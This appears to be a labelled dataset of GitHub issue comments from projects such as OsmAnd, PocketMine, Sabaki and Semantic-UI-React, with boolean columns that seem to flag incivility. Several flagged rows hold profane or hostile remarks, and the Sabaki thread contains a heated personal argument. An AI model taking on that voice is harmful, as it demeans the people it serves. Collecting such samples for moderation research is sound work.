Osmand/osmandapp/3663/307708366,"@friend  it will be no 2.6 release anymore, 2.7 suppose to happen next month. ",False,True,False,Osmand/osmandapp/3663
Osmand/osmandapp/3663/405546321,The unnecessary 'keep right' instructions are still being issued along the M8 ,False,True,False,Osmand/osmandapp/3663
Osmand/osmandapp/3663/405876681,"from my observation ""unnecessary"" keep right or keep left announcement are based on osm data. this usually happens if two ways run parallel for short time or has a quite small angle between them. you can often see this at exit lanes where different mapping styles exist. Some Communities map Exit lanes as own way, some other start a new qay only at the Point where the road really splits. In some cases those announcements are very useful in some other they are wrong. For example at this place, going from north to south  there is always a ""Keep left"" but i don't know why. ",False,True,False,Osmand/osmandapp/3663
Osmand/osmandapp/3663/406539669,"Yes, that holds with what I've experienced, but only sometimes.  Sometimes the exit sliproad is completely ignored, despite being as just as shallow an angle as other that are indicated.  So does this mean it's OsmAnd's interpretation of the OSM data, or is it a flag set in the OSM data somewhere?  If it's the former, then it's still a bug that's present.  If it's the latter, then it means editing the OSM data. ",False,True,False,Osmand/osmandapp/3663
Osmand/osmandapp/3663/406549546,Best would be if an osmand developer would tell what exact conditions needs to be met to play the anouncement. Do you have some examples where the issue occurs and where not? Maybe ist possible to find something. ,False,True,False,Osmand/osmandapp/3663
Osmand/osmandapp/3663/406879242,"@friend I posted a route already.  Some junctions it will do it, others it will not. ",False,True,False,Osmand/osmandapp/3663
Osmand/osmandapp/3663/407216416,"@friend It has been a long time since I looked at that code, and I think it has been stable ever since From what I remember, this is about how we do it We look at the angular change a turn after a fork eventually takes you through vs. your initial bearing. If it is between 10 and 45 degrees, a ""Keep Left"" respectively """"Keep Right"" turn type is detected. So I assume that ""false"" announcements may happen where a road forks, and both forks are a slight turn. While driving on one of them, you may perceive this as 'going straight', but looking at an aerial view, you may realize you take one of 2 slightly bent forks legs. I do think we factor in the hierarchy of roads, so this will probably not occur if you are and stay on a primary road, and an unused trail forks in one of its turns. But I am not sure if it may happen in certain forks between a motorway and a motorway link.  And it may be justified there, e.g. some motorway intersections / cloverleaves may be tagged with a mixture of motorway on motorway links on forks which look of rather equal hierarchy when driving on them (vs. in the exit situation you may argue that staying on the motorway requires no turn prompt.). ",False,True,False,Osmand/osmandapp/3663
Osmand/osmandapp/3663/407348784,"@friend sounds correct to me, i remember a different place where a fork is within a (slight) curve and the anouncement is played. I think adding an additional condition which checks the road class would fix a lot of those false announcements. But what to do if the road Segments have the same class? ",False,True,False,Osmand/osmandapp/3663
Osmand/osmandapp/3663/407553984,"IMHO,  it is often a case-by-case decision and sometimes hard to get 'right' by just looking at the map data. What we do is err on the safe side snd rather play the prompt too often than too seldom. I believe it works well in many areas, but I can well imagine there are issues in rather montaineous areas or other regions with curvy highway sections and associated crossings. Not currently sure how to implement an overall improvement, although most certainly not impossible. ",False,True,False,Osmand/osmandapp/3663
PHPCI/Block8/1234/161755247,"I have this problem on a virtual-machine running ubuntu server 16.04. Error-Message is♠Warning fsockopen() unable to connect to localhost11300 (Connection refused) in /var/www/phpci/vendor/pda/pheanstalk/src/Socket/StreamFunctions.php line 73` What could i do here? It is a fresh installed Ubuntu Server with Apache, PHP7, Mysql etc. Expected behaviour  I don't know, as i have never reached the next page before. I would say No error -) *  Actual behaviour  Instead i see the message Warning fsockopen() unable to connect to localhost11300*  Steps to reproduce  Install it like described in the guide on a very clean ubuntu server 16.04 virtual machine. i used vbox on windows. add a new github project and click on ""build"". *  Environment info Operating System ubuntu server 16.04  PHP Version 7.0 MySQL Version 5.7.12 Logs or other output that would be helpful Please tell me, which logs you need, and i will upload them. ",False,True,False,PHPCI/Block8/1234
PHPCI/Block8/1234/228012210,"This is fixed in v1.7.1  @friend mentioned, you either don't have beanstalkd or you haven't configured it properly in PHPCI. ",False,True,False,PHPCI/Block8/1234
PMCADemo/ma1co/8/151135252,Could sombody help me with compilation? I'm getting the following error during gradle build 35         textView = (TextView) findViewById(R.id.logView);   36    37         wifiManager = (WifiManager) getSystemService(Context.WIFI_SERVICE);   38         wifiDirectManager = (DirectManager) getSystemService(DirectManager.WIFI_DIRECT_SERVICE); 39    40         wifiStateReceiver = new BroadcastReceiver() { ,False,True,False,PMCADemo/ma1co/8
PMCADemo/ma1co/8/214750333,"Add this to the  declaration @friend.annotation.SuppressLint(""WrongConstant"")  ",False,True,False,PMCADemo/ma1co/8
PMCADemo/ma1co/8/225746720,I had the same error.  Should this be added into the source or are @friend and I setting something up wrong? ,False,True,False,PMCADemo/ma1co/8
PanDA-NGE/ATLAS-Titan/8/315218539,To be included in Agenda for Ruslan vist ,False,True,False,PanDA-NGE/ATLAS-Titan/8
Panoptes-Front-End/zooniverse/11/46497845,This adds an ellipse tool for drawing tasks and improves conventions for building new tools. ,False,True,False,Panoptes-Front-End/zooniverse/11
Panoptes-Front-End/zooniverse/11/60130571,"Man, these ellipses are fun to draw. The only error I can produce is on the initial drag returning the cursor to the '0,0' point while the mouse is still being held down throws- ",False,True,False,Panoptes-Front-End/zooniverse/11
Panoptes-Front-End/zooniverse/11/60763764,"Nice catch. Fixed it, and simplified the heck outta the math. ",False,True,False,Panoptes-Front-End/zooniverse/11
PocketMine-MP/pmmp/1945/290220447,"Issue description In fact you made things worse, for all the cheaters now there is an opportunity super fast to break blocks. Now all users will NEED to make a separate plugin to fix this problem.  The best option was to leave it standard, if someone didn't like it, it was the switch in pocketmine.yml Really, thanks to you, I got ruined the world of survival and now have to do the cleaning map. Ex js code Video  and versions  PocketMine-MP  7.2 Game version PE/Win10)  ",False,True,False,PocketMine-MP/pmmp/1945
PocketMine-MP/pmmp/1945/359199659,Such a plugin already exists. And you chose to use a bleeding-edge build with it removed. You have nobody to blame but yourself. ,False,True,False,PocketMine-MP/pmmp/1945
PocketMine-MP/pmmp/1945/359199958,"Let's remove anti-cheat motion, which delivers more of a pain in the ass. After all, it is also possible to add a plugin. ",True,True,False,PocketMine-MP/pmmp/1945
PocketMine-MP/pmmp/2187/324211421,"Issue description After the new update, i try to join my server and it just crashes my whole client, this has been reoccurring since the new update Steps to reproduce the issue 1 Put the latest dev version  (1.7dev-999 「[REDACTED]) in your server folders 2 Try to join your server 3 client crashes OS and versions Pocketmine 1.7dev-999 「[REDACTED]」 ",False,True,False,PocketMine-MP/pmmp/2187
PocketMine-MP/pmmp/2187/390037053,Do you have purePerms installed?  That causes the crash. ,False,True,False,PocketMine-MP/pmmp/2187
PocketMine-MP/pmmp/2187/390037146,"Please fill out all of the issue template, don't delete half of it. ",False,True,False,PocketMine-MP/pmmp/2187
PocketMine-MP/pmmp/2187/390037222,Somebody used this same template that i just used and your getting on me about it? ,False,True,False,PocketMine-MP/pmmp/2187
PocketMine-MP/pmmp/2187/390037359,"you simply deleted the plugins section, and wasted two issues with no information on them. Fill it out properly. ",False,True,False,PocketMine-MP/pmmp/2187
PocketMine-MP/pmmp/2187/390037567,Okay lol but you used the same template and everythings okay? How about you also do what you're telling me to do rather than just taking short cuts aswell. ,False,True,False,PocketMine-MP/pmmp/2187
PocketMine-MP/pmmp/2187/390037882,"The template exists for the sake of structured communication of an issue. If you want an issue resolving, then provide the information we ask for. How we deal with issues created ourselves is not relevant to this subject. ",False,True,False,PocketMine-MP/pmmp/2187
PocketMine-MP/pmmp/2187/390038360,Okay then fill out that long ass template just like we have to do rather than just taking a shortcut. ,True,True,False,PocketMine-MP/pmmp/2187
PokemonGo-Web/PokemonGoF/118/232976075,"I have 2 Bots running on 2 Servers What I want to do is to have both bots showing in the Web UI of Server1 What is working in this config is that both accounts are shown on the right under ""bots"", but only account1@friend.com is showing a route and any informations about Info or Pokemon. The Log Popups in the bottom left show information from both bots. I opened ports 4000 and 5000 The webserver is nginx, but with the python webserver it did exactly the same. I changed the Web UI to port 80 far before i added the second bot. The Userdata.js on the Server1 with the active Web UI         enable true,         username ""account1@friend.com"",         socketAddress ""externalIP-Server14000"",         enableSocket true     },{         enable true,         username ""account2@friend.com"",         socketAddress ""externalIP-Server25000"",         enableSocket true  Config on Server1 ""websocket_server"" true,  ...   ""websocket"" {         ""start_embedded_server"" true,         ""server_url"" ""externalIP-Server14000""     } } Config on Server2 ""websocket_server"" true,  ...    ""websocket"" {         ""start_embedded_server"" true,         ""server_url"" ""externalIP-Server25000""     } } Can anybody help me? I cant find a full documetation about running multiple bots in one Web UI, is there one? ",False,True,False,PokemonGo-Web/PokemonGoF/118
PokemonGo-Web/PokemonGoF/118/319224403,"Old issue, multiple accounts are working fine in bot. ",False,True,False,PokemonGo-Web/PokemonGoF/118
Polaris/PolarisSS13/4539/288474267,"Tesla Engine Ported from Paradise and TG; many authors involved  Items added  Adds the Tesla energy ball.  Its created by bombarding the Tesla generator with the Particle Accelerator.  Its a big ball that shoots lightning bolts at stuff.   Don't let it hit you.   Luckily the singularity containment field works on the energy ball too. Adds the Tesla coil and grounding rod machines.  They are how you actually gather power from the energy ball and protect the station from lightning bolts. They are both constructable in game, get circuits from RnD and autolathe respectively.   Adds the Tesla generator. This is required to actually make the Tesla energy ball.  This is not mapped in and the generator can't be built or ordered from cargo.  Therefore players can't actually get the Tesla engine running in game unless an admin spawns it or it is added to the map. In game manual forthcoming in case its decided to let players build it.  Supporting technologies  Ports typecache list procs from TG.  These are a fast way to filter a list of atoms by type. Ports the ""orbit"" feature and subsystem from TG ( tgstation/tgstation#10960 tgstation/tgstation#20632 ) Adds utility methods for common machinery behavior.  I have wanted this for awhile. It could get even more sophisticated if we wanted, but  takes care of the most common repeated code in machinery   ",False,True,False,Polaris/PolarisSS13/4539
Polaris/PolarisSS13/4539/357643885,@friend fixed build (test) issue. ,False,True,False,Polaris/PolarisSS13/4539
Polaris/PolarisSS13/4539/359081381,"How 'bout that tesla, @friend ",False,True,False,Polaris/PolarisSS13/4539
Polaris/PolarisSS13/4539/359086625,Oh right! That! ,False,True,False,Polaris/PolarisSS13/4539
PublicBikes/Lee-Nover/47/22388530,Get the nearest other public transport if available in case of rain or other ... ,False,True,False,PublicBikes/Lee-Nover/47
PufferPanel/PufferPanel/142/40318553,,False,True,False,PufferPanel/PufferPanel/142
PufferPanel/PufferPanel/142/56368554,"Ok, I've started this. Will be done this week ) ",False,True,False,PufferPanel/PufferPanel/142
PufferPanel/PufferPanel/142/56368689,"Or, if you already done sth tell me what, so I'll do the rest P ",False,True,False,PufferPanel/PufferPanel/142
PufferPanel/PufferPanel/142/57449926,As you can see in @friend/PufferPanel I've done Admin management for domains (not sub-domains).  All is going better than expected (excepting time...)! ,False,True,False,PufferPanel/PufferPanel/142
RasPlex/RasPlex/562/206882649,"Hello, Is it possible to add support for this chipset wireless ? I can help if you want. Thanks. Jon ",False,True,False,RasPlex/RasPlex/562
RasPlex/RasPlex/562/379328648,yeah that would be great. or at least short instructions how the driver could be installed manually? (mt7610) because the instructions from here are not working on the libreelec/rasplex system  ,False,True,False,RasPlex/RasPlex/562
RasPlex/RasPlex/562/379350509,"Nobody listen to this fucking repo ( On Fri, 6 Apr 2018, 1953 Joseph Weigl, notifications@friend.com wrote ",True,True,False,RasPlex/RasPlex/562
RestSharp/restsharp/865/165946609,"Problem why the customer object inresponse.Data always null？ situation after var response = client.Execute&lt;T&gt;(request) response.Content = ""{\""code\""0,\""customer\""{\""customer_id\""\""1002\"",\""business_id\""\""2\"",\""card_id\""\""A1A2A3A4\"",\""total_credit\""\""5\"",\""date_registered\""\""2016-07-13 005138\"",\""date_updated\""\""2016-07-13 005138\""}}"" but response.Data = { code = 0, customer = null}  Usage ` The struct of response data ",False,True,False,RestSharp/restsharp/865
RestSharp/restsharp/865/233555238,"Hi,  actually you are getting whole object as new, not only customer. But because code is int, default is 0. So, I recommend to not use 0 as OK result. Or even better, exclude code from json and use common http status codes? To your problem, cannot say exactly, quick checked on mine and it's deserialized correctly. Maybe there is some issue in headers, but I've also made some changes and wasn't able to break it. So, I can only recommend to download RS source and track deserialization to the issue. ",False,True,False,RestSharp/restsharp/865
RestSharp/restsharp/865/233670463,"Hi again, tried once more with exact your code .. and it doesn't work .. So, my research leaded me to request.Resource = ""customer""; request.RootElement = ""customer""; you are marking root element as Customer, but deserializing to GetCustomerByCustomerIdResponse So, RS will get only customer object from content and trying to create GetCustomerByCustomerIdResponse object from it. Well, it won't fit, so default. To fix it, deserialize to Customer class or just comment those two lines, then it will work. (Tested both.) ",False,True,False,RestSharp/restsharp/865
RestSharp/restsharp/865/485729330,That's probably related with #1306 ,False,True,False,RestSharp/restsharp/865
RxSwift/ReactiveX/408/127143560,"UIBarButtonItem has only one target, so UIBarButtonItem.rx_tap cannot share now. I move ControlEvent initializer to BarButtonItemTarget, and reuse it. Then, UIBarButtonItem.rx_tap can share. Please check this pr 3 ",False,True,False,RxSwift/ReactiveX/408
RxSwift/ReactiveX/408/172464924,@friend can you create PR against  branch? ,False,True,False,RxSwift/ReactiveX/408
RxSwift/ReactiveX/408/172466202,"oops! I'm sorry, I make pr again. ",False,True,False,RxSwift/ReactiveX/408
RxSwift/ReactiveX/408/172467373,I opened new PR now. Please close this.  Thank you. ,False,True,False,RxSwift/ReactiveX/408
Sabaki/SabakiHQ/341/300116763,"Is it just me, or does Sabaki not allow making games with different rule sets, e.g. Chinese, Japanese, Tromp Taylor, etc.? It even doesn't show which rule set is being used in a loaded SGF file (under Game Info). I think the scoring is restricted to Japanese only. If I'm correct, then please consider this an enhancement request to allow for at least Chinese and Japanese rules, and perhaps even Tromp Taylor rules, as this would be very useful for looking at games created by Leela Zero. Even if you don't fully implement different rule sets in game play, at least please display the rule set defined in the game's SGF file. ",False,True,False,Sabaki/SabakiHQ/341
Sabaki/SabakiHQ/341/368405261,"There's no concept of a ruleset in SGF, because the user can do anything they want. Sabaki only show warnings for simple Ko and suicide which can be disabled in Preferences. As for scoring, there is an option to toggle between area and territory scoring. ",False,True,False,Sabaki/SabakiHQ/341
Sabaki/SabakiHQ/341/368487696,"There is a tag, RU (see  for specification. NZ rules would be roughly equivalent to Tromp-Taylor, as far as I know, just FYI), which defines the assumed overall rule set for the SGF. Any moves in the SGF which violate the specified rules could be considered illegal moves, perhaps making the SGF invalid. However, to say there's 'no concept' of ruleset in SGF is simply incorrect. As for the option to toggle scoring, it is definitely not obvious in the UI. I looked for it before posting this, although I was looking for changing the rule set, not for 'area vs. territory'. I'll look again.... Okay, that is definitely not obvious. Instead of being under Preferences or Game Info, you have to click on the score display within Score or Estimate, and the score certainly does not appear to be a button of any kind at first glance. Personally, I would try to follow the principles laid out in The Design of Everyday Things, by Don Norman, a very well-known design and usability researcher. For example, one of his principles is that a single control on an interface should ideally have a single function the score display violates this principle by acting as both a simple display and as a button, with no additional visual affordance to indicate that it might be a button (although mouse hovering does indicate this, but who would think to hover over the score display? I didn't, until prompted by your comment). Compare this with a hyperlink, which is also a clickable display object, but which provides the visual affordances of being a different colour to the surrounding text and is also usually with an adornment such as being underlined. Just my opinion. ",False,True,False,Sabaki/SabakiHQ/341
Sabaki/SabakiHQ/341/368529038,"@friend Perhaps you have a suggestion instead of criticizing with a quote from a 16 year old book? (Actually, the book is 30 years old. I wouldn't be surprised if things have changed since then. But then again, I haven't read that book, so I can't say for sure.) Previously, the button would only display 'Done', but I changed it so it would display useful information instead of just being a waste of space. Also, the data for both area and territory are visible, just the end result changes when you toggle between them. I agree there is a property for specifying the ruleset, but it shouldn't have an effect on someone who edits the game. That's what I meant by 'no concept'. It's only there for reference purposes, like game name/date, handicap stones, and copyright. That said, we could display the value of the property somewhere in game info. ",True,True,False,Sabaki/SabakiHQ/341
Sabaki/SabakiHQ/341/368601849,"It is meant as constructive criticism. It's a very good book, which is why it's still in print, and the principles are time-tested. Also, I didn't quote the book, but referenced it from my memory of it. My Computer Science degree was specialized in Human-Computer Interaction, and Don Norman is well-known in that field. That's how I know about the book, and why I read it. Also, I did give a concrete suggestion, but since I added it later as an edit, perhaps you missed it ... Which button are you referring to? I'm referring to the score display control that shows up when you do Estimate, and it shows, for example, something like ""W+50.5"", and when you hover over it, it says ""Details"". Clicking on that control/button brings you to the Score calculation dialog where you can finally select Area or Territory. It's this dual-purpose control that both displays the score and is also a Details button that I'm referring to. It doesn't sound the same as the Done button you're referring to. Just for reference, other Go UIs such as the WGo UI display both territory and area scoring when you select Count Score from its hamburger menu. The real issue here is that I was opening SGF files which had their RU tag set to 'Chinese', but Sabaki was showing scoring based on territory/Japanese, rather than area/Chinese. If the scoring defaulted to area for 'Chinese', and territory for 'Japanese', that would be better, IMO. Unless they are opening multiple SGF files, in which case, the users would expect that the 'score' should be based on the ruleset specified by the existing SGF. Games from different sources, or even the same source (such as OGS), can use different rulesets from one game to the next. If the user has to open up the SGF file in a text editor to discover what the ruleset is, and then locate the difficult-to-find Details/Score calculation dialog just to toggle to the right scoring method, that's a pretty big pain in the UI. Sabaki can easily figure out which scoring should be default and toggle to that. Or, alternatively, just show both scoring methods, each on its own line, when the user clicks Estimate. Presumably, it also specifies how the score in the game result property was calculated. ",False,True,False,Sabaki/SabakiHQ/341
Sabaki/SabakiHQ/341/368614761,"It's hardly constructive criticism, since you didn't say what exactly can be changed. Also I don't know the book and am hardly willing to read it just for you. Furthermore, I didn't study Human-Computer Interaction. Let's not argue about formal definitions. My argument still stands if you change one wording for another. I did indeed miss this, but please do explain yourself further. That's exactly the button I'm referring to. No contradictions here. And I think WGo can be customized either way. I'm not a fan of how opening an SGF file can change a user's setting. Also, if the score has already been calculated, there is no need to calculate it again with the scoring tool. This is actually a good idea. ",False,True,False,Sabaki/SabakiHQ/341
Sabaki/SabakiHQ/341/368669841,"But I did. Maybe not as directly as I could have, but here are examples from that comment ... Obviously, I didn't suggest for you to read it just for me. In fact, I didn't even suggest for you to read it at all. I simply referenced it by link so that you'd know what book I was referring to. If you were to read it, it would be for your own sake, obviously, not mine. I don't suggest people do things just for me in the first place. If I didn't care about the success of this project at some level, I wouldn't have posted anything here at all. It takes time and effort to write an Issue report and follow up on the comment thread. There are plenty of other things I could spend my time and effort on. I chose to contribute to this project rather than some other. You needn't have had to. I'm just explaining how I know about the book and what field it is typically associated with (though it's even more general than HCI). You seemed to be wondering why I referenced a 15-30 year old book. Hence, I explained why. But all of that is kind of irrelevant as to whether or not to support different Go rule sets, or how to make the scoring mode more accessible and usable. It's just background information. Actually, regarding whether I quoted the book or referenced it from memory, I'm not exactly sure what your argument is, to be honest. What would it matter either way? Not sure what else to say. Right now it has a single line saying Just make it two lines Okay then, that's the button that has two functions, and one of them is not obvious (being the Details button where scoring mode toggling is hidden). That's the button I'm suggesting to either  1) Make it two controls, a Score display, and a separate Details button, or  2) Make it more obvious it's a button by adding visual affordances to it, such as by making it a hyperlink instead, or  3) Don't hide the scoring method toggle inside it; instead put the scoring method toggle in Preferences or Game Info, or  4) Partially eliminate the need for a scoring method toggle by showing both area and territory scoring on the same panel, as above, or  5) Something else if you prefer. I wasn't pointing out a contradiction, I was giving an example of another Go UI that already partially eliminates the need for a scoring method toggle by simply showing both scoring methods simultaneously, as above, suggestion 4. I disagree with your assumption that the scoring method is a property of the user's settings. IMHO, it should be a property of the game's settings. Therefore, it can and should be different depending on the SGF file, because that's where the scoring method (i.e. rule set) is specified. IMHO. Maybe the user's settings could include a 'default scoring method' for when they make a new game from scratch, but when loading existing games, which used pre-determined (i.e. before the game even began) scoring methods, I think the UI should reflect the game's settings primarily, and the user's settings should only be a default, if the game has no rule set specified. IMHO, of course. (Just assume I have 'IMHO' tacked on at the end of each sentence.) I'm not sure what this is referring to. Perhaps you mean the final game result? Thanks, but it's not really my idea. It's Don Norman's (or rather, I got it from his book; he probably learned it somewhere else, I'm guessing), namely the principle that each user control should have only one obvious function -- the corollary being that if you need to put in two functions, put in two separate controls. It's not a 100% all the time thing, it's just a principle. But a good one. From a time-tested book by a well-known researcher and engineer. (In case you were wondering where I got it from. Whether you read it or not is not my concern.) ",False,True,False,Sabaki/SabakiHQ/341
Sabaki/SabakiHQ/341/368690688,"Anyway, to simplify this thread  Area      [W+50.5]    Toggle group status     [x] Territory [W+45.5] Don't like it since it takes up two lines instead of one.  Also, if the score has already been calculated, there is no need to calculate it again with the scoring tool.  Not sure what else to say. Scoring the game only makes actual sense if it is your own game, since finished SGF files already have the score in its result field. One can take an SGF file and start playing from somewhere in the middle with an engine and score the game their way.  I think the best way to avoid the double concern is to let the button show 'Details' and have another label to show the score for those who don't realize the 'visual affordance' I put into the button. In any case, I wanted some good reasoning to do something, not just a quote or a reference or whatever to a 'well-known researcher'. Controls which have more than one function are quite common nowadays. It's a great way to provide functionality without cluttering the UI. You just have to look at Apple's iOS, well-known for its design and UX.   While I appreciate everyone who takes their time with my projects, your second post wasn't constructive criticism at all despite your flimsy justifications and hit a nerve. Especially by referencing a book to avoid giving any reasons yourself raised a red flag in me. ",True,True,False,Sabaki/SabakiHQ/341
Sabaki/SabakiHQ/341/368691858,"Since this discussion went way out of hand and I do not want to discuss it any further, I will lock this issue. ",False,True,False,Sabaki/SabakiHQ/341
Semantic-UI-React/Semantic-Org/2550/298785595,Creating this as a container for referencing other issues that are likely to pop up with the release of SUI 2.3 which happened today. Feel free to edit this and add related issues below for tracking. Notes about what is new in this release  issues so far. Please edit this list to add or link to issues [] Fix modal placement (#2549)  [] Update  component to use new FontAwesome 5.0 icons. ,False,True,False,Semantic-UI-React/Semantic-Org/2550
Semantic-UI-React/Semantic-Org/2550/367181115,"Oh, great idea.  I think we just ship this as a new breaking change.  We can then bundle all 2.3.x changes into one release.  Thanks for starting the list! ",False,True,False,Semantic-UI-React/Semantic-Org/2550
Semantic-UI-React/Semantic-Org/2550/367474770,"Updated the list with a few more and also added a link to the full CHANGELOG. There may be one or two I missed. And with how we render popups via a Portal, I am not sure we have to worry about the update allowing you to trigger a popup from other blocks of markup. ",False,True,False,Semantic-UI-React/Semantic-Org/2550
Semantic-UI-React/Semantic-Org/2550/368406941,I think we're ready to go here.  Changing labels. ,False,True,False,Semantic-UI-React/Semantic-Org/2550
Semantic-UI-React/Semantic-Org/2550/372808393,Any update on this? Modal is not usable. ,False,True,False,Semantic-UI-React/Semantic-Org/2550
Semantic-UI-React/Semantic-Org/2550/372837535,"@friend any issues tagged with  are open for anyone to submit PRs to fix. You are welcome to do so. Any info related to this and all issues will be shown above in the issue history. Based on reading this history, it looks like there are no open PRs yet. ",False,True,False,Semantic-UI-React/Semantic-Org/2550
Semantic-UI-React/Semantic-Org/2550/372863017,Any chance your Modal documentation can be updated to reflect the modal placement issue? ,False,True,False,Semantic-UI-React/Semantic-Org/2550
Semantic-UI-React/Semantic-Org/2550/372968617,"In any case, it seems wise to add a warning on the docs homepage that Semantic UI React is not officially compatible with Semantic UI 2.3 yet, and that using the 2.3 css in combination with the latest react version is at your own risk until this issue is resolved. ",False,True,False,Semantic-UI-React/Semantic-Org/2550
Semantic-UI-React/Semantic-Org/2550/373074400,"Valid point @friend, @friend. Since this issue was not picked up quickly for work, I have submitted a quick PR to update the README.md in #2644 linking here to alert people until we get a patch on this. Fingers crossed, I am hoping to at minimum get the modal working with 2.3 over the weekend. ",False,True,False,Semantic-UI-React/Semantic-Org/2550
Semantic-UI-React/Semantic-Org/2550/373993198,"See #2657, I've made updates for  and . We need updates for  and  before we can ship it. ",False,True,False,Semantic-UI-React/Semantic-Org/2550
Semantic-UI-React/Semantic-Org/2550/374248023,"@friend I have some time blocked out tomorrow afternoon to tackle . Do you mind if I just add those commits into your PR branch? If I have the time I may also be able to tackle . I think there were a LOT of additions in this new version of FontAwesome so that might take a while, but I have not looked into seeing if there is an easy to parse list in the CSS on SUI somewhere yet. ",False,True,False,Semantic-UI-React/Semantic-Org/2550
Semantic-UI-React/Semantic-Org/2550/374668556,"@friend I've merged PR for  to , with generator, BTW smile_cat ",False,True,False,Semantic-UI-React/Semantic-Org/2550
Semantic-UI-React/Semantic-Org/2550/374723834,There is a message for Modals in 2.3.1 ,False,True,False,Semantic-UI-React/Semantic-Org/2550
Semantic-UI-React/Semantic-Org/2550/375004834,"In light of the release notes for 2.3.1 referenced above, it seems like support for either version of the modals is the long term strategy for SUI core styles. I need to dig in over there to find out for sure, but if this is the case, we'll probably have to go with my earliest proposal in this comment. If indeed there will be the ability to go either way on this in the styles, I'll make sure the PR has the above option for our modals as well. ",False,True,False,Semantic-UI-React/Semantic-Org/2550
Semantic-UI-React/Semantic-Org/2550/376652870,I haven't received a reply yet on my question here for @friend so I think for now I am just going to proceed without some sort of legacy/fallback prop. I'll try to keep a close eye on whatever happens with modals in the next version of SUI since it sounds like there are going to be some additional breaking changes incoming. Starting a branch on this now in the office as I've blocked out some official work hours to get this working. PR should be up this afternoon. ,False,True,False,Semantic-UI-React/Semantic-Org/2550
Semantic-UI-React/Semantic-Org/2550/376733818,"To update on Modal positioning, see this comment from the linked issue in SUI ",False,True,False,Semantic-UI-React/Semantic-Org/2550
Semantic-UI-React/Semantic-Org/2550/379253505,"Quick fix for modal positioning, working here with SUI 2.3.1 &amp; SUIR 0.79.1 .visible.transition {   display unset !important; }  .dimmed.dimmable &gt; .ui.visible.dimmer, .ui.active.dimmer {   display -ms-flexbox;   display flex !important;   opacity 1; }  ",False,True,False,Semantic-UI-React/Semantic-Org/2550
Semantic-UI-React/Semantic-Org/2550/379341122,"@friend, and for anyone landing here, I would recommend against what you have proposed for . Those classes are used for lots of other things in the SUI css, not just modals. A safer solution for anyone wanting to use the newest version of SUI styles and this incompatible version of SUIR would be safer doing the following There are other problems you'll encounter using the latest styles, but those above changes should at least fix modals. The last fix for this is coming in PR #2689. ",False,True,False,Semantic-UI-React/Semantic-Org/2550
Semantic-UI-React/Semantic-Org/2550/385512068,"This may be part of what @friend was referring to regarding Icons, but since the shift to FontAwesome 5, an error is being thrown for ""invalid"" icon names.  They are raising an error (it looks like) because SUI.js does not have the correct list of icon names for FA5.  Thankfully, the icons still show correctly on the page. ",False,True,False,Semantic-UI-React/Semantic-Org/2550
Semantic-UI-React/Semantic-Org/2550/385523760,"@friend those are only proptype errors. If you are not using another component broken by these changes and want to continue using a newer version of the CSS than we currently support until 2657 gets merged and deployed, you can just declare your icon names in the prop instead of the  prop on your  component. ",False,True,False,Semantic-UI-React/Semantic-Org/2550
Semantic-UI-React/Semantic-Org/2550/391946457,"What versions of semantic-ui-react and semantic-ui-css are sufficiently compatible with each other? It is very difficult for a newbie, like myself, to use this library when it is unclear which versions of libraries should be used together. Placing this information, if available, in the README would be a huge help. ",False,True,False,Semantic-UI-React/Semantic-Org/2550
Semantic-UI-React/Semantic-Org/2550/391949560,currently compatible only with . ,False,True,False,Semantic-UI-React/Semantic-Org/2550
Semantic-UI-React/Semantic-Org/2550/392205508,@friend Please take a look at the VERY first thing at the top of the README.md ,False,True,False,Semantic-UI-React/Semantic-Org/2550
SevTech-Ages/DarkPacks/2607/325759549,"           hi my name is Smilemore79 I play sevtech ages on a server I'm very into it and love the way the mod is set up. not sure if I'm in the right place here for my issue I'm having. I'm in age three now and I'm wanting to make the bottler machine, it calls for the fluid pump, however I cant find any information or crafting recipe for it.  ",False,True,False,SevTech-Ages/DarkPacks/2607
SevTech-Ages/DarkPacks/2607/391451401,this forum sucks ass ,True,True,False,SevTech-Ages/DarkPacks/2607
SevTech-Ages/DarkPacks/2977/399667432,"I'll go over this in detail later on. But to clarify one thing until then. This was posted due to the fact you opened a tonne of petty issues on that day all of which lack details and you expected us to help/give support on little to now information. That and most of them are Discord issues. This tracker is for bug reports and mod suggestions not. This is why we have Discord it's open and more people can make an input on helping/teaching people. This is a hobby for myself and all the developers who make this pack. We're not going to waste our own time when working on the pack and then deal with issues which no effort was put into them or could have been dealt with in Disord. When we have pack testers, moderators and even the user base helping each other out. If you felt hurt by that then you need to understand that we're not going to spoon feed users on this tracker on how to do x or y. A lot of modpacks use new mods or mods which change mechanics which do lack documentation. But this is why those packs have Reddit's or Discord or even Forums where the community creates the documentation. One big example being this  like this was all done by the community. It's linked in Discord on our Wiki and even on top results for Google. But that's all I'm going to cover for the time being. I'll comment in regards to each section later but I wanted to hit this on the nail. ",False,True,False,SevTech-Ages/DarkPacks/2977
SevTech-Ages/DarkPacks/2977/399667555,But to be clear this pack was designed for Sevadus. It's designed around him and how he wanted it. Nothing will change in regards to the advancements or layout. It's done to a spec which we met. ,False,True,False,SevTech-Ages/DarkPacks/2977
SevTech-Ages/DarkPacks/2977/335083459,"     Context I am trying to give feedback on what the pack is like for a new player, who has not played it before. I suspect that you have gotten so familiar with the pack that you don't even think about the experience of a new player. The most important player you have is the new player. If you do not get new players, you wind up with a declining population and eventual nothingness; additionally, new players recruit other new players. As a new player, this is what I have seen, that really seems to define the pack for me Go to a kitchen counter (you can do this as a thought experiment if you want), and clear a meter square surface. Use some tissue paper (or toilet paper), and divide it into 1' x 1' squares. Stand in front of it. Now, keeping your eyes straightforward, move your neck to where you are looking around at all 9 spaces. Notice how much head movement you have, notice how much work is involved. Now, just look at the whole table, and move your hand around all 9 spaces. Notice how much easier it is? This is without taking into account that the mouse movements needed to aim where you are looking at for the 3 spaces closest to you are actually much more exaggerated than for the others. An ""in-world crafting table"", or ""non-GUI interface"" is not ""more realistic"". It is denying the use of hands to do things. It is taking the worst choices of the interface and controls of Minecraft and magnifying their effect. And it completely eliminates the concept of saying, ""I'm focusing on the crafting table, I'm using my hands to place things on the table, and I'm going to look things up in the recipe book"". Good or bad, you have basically chosen to document the modpack and its recipes with JEI. And that documentation is lost as soon as you are using the work stump. The mod page for primal tech (work stump mod) claims that it has JEI support. Yet I don't see it in play. Now, let's look at these work stump, wooden hopper, chest, shelf (cupboard), water strainer. The basic operations on stores of inventory items are deposit one, deposit stack, remove stack, remove one, remove half stack. The documentation for what key/mouse commands do what is nonexistent. Each block seems to have a slightly different set of controls than the other blocks, and none of them are documented. If you make a mistake with the water strainer (taking out too much), you can't put the others back. If you try to take one repeatedly from either the wooden hopper, the chest, or the shelf you wind up placing the block that you just took 